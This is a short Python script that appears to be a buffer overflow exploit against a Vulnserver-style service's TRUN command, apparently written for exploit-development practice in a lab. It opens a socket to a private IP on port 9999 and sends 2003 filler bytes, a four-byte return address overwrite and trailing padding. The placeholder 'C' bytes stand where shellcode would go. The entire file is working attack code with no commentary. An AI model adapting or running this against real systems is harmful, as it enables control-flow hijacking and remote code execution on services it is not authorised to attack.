#!/usr/bin/python

import sys
import socket 

shellcode = 'A' * 2003 + '\xaf\x11\x50\x62' + 'C'*(1400-515-4)

try:
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('192.168.0.126',9999))

	s.send(('TRUN /.:/' + shellcode)) 
	s.close()

except:
	print ('error connecting to server')
	sys.exit()
